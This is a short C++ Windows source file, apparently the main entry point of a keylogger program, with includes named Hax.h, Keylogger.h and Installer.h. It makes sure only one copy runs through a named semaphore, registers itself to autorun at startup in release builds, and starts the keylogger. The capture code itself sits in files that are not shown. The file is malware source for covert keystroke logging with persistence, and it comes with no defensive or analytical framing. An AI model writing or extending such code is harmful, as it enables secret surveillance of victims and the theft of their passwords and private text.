
#include "stdafx.h"
#include "Hax.h"
#include "Keylogger.h"
#include "Installer.h"


TCHAR semName[] = _T("VSem");

extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
	if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
	{
		Error(_T("Already running"));
		CloseHandle(hSem);
		return 0;
	}

	installer.SetAutorun(true);
#ifdef _DEBUG
	installer.SetAutorun(false);
#endif
	keylogger.Run();

	CloseHandle(hSem);
	return 0;
}
